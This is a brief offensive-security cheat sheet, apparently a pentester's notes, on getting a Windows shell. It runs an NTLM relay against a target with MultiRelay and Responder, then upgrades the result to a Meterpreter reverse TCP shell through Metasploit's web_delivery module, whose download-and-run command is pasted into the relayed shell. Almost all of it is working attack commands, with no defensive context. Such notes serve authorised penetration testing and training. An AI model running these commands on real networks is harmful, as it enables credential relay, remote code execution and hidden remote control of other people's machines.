# Establish Windows Shell
```bash
# Establish MultiRelay shell
./MultiRelay.py -t 172.16.5.10 -u ALL
# If responder is running before MultiRelay, responder will listen on ports 80 and 443 and prevent MultiRelay from running.
responder -I eth1 --lm

# Upgrade MultiRelay Shell to Meterpreter Shell
msfconsole
use exploit/multi/script/web_delivery
set LHOST <IP Address or Interface>

show targets
set TARGET 3
set PAYLOAD windows/meterpreter/reverse_tcp
run

# Copy the returned command into the MultiRelay shell
```

# References
[Github](https://github.com/lgandx/Responder-Windows)